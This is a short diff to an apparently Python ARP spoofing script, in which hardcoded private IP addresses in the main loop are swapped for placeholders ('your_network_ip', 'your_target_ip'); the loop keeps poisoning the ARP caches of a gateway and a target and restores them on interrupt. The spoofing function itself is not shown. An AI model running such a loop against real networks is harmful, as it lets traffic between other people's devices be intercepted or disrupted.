@@ -26,11 +26,11 @@ def spoof_arp(target_ip,spoofed_ip):
 def main():
     try:
         while True:
-            spoof_arp("192.168.1.1","192.168.1.110")
-            spoof_arp("192.168.1.110","192.168.1.1")
+            spoof_arp("your_network_ip","your_target_ip")
+            spoof_arp("your_target_ip","your_network_ip")
     except KeyboardInterrupt:
-        restore("192.168.1.1","192.168.1.110")
-        restore("192.168.1.110","192.168.1.1")
+        restore("your_network_ip","your_target_ip")
+        restore("your_target_ip","your_network_ip")
         exit(0)
 
 main()
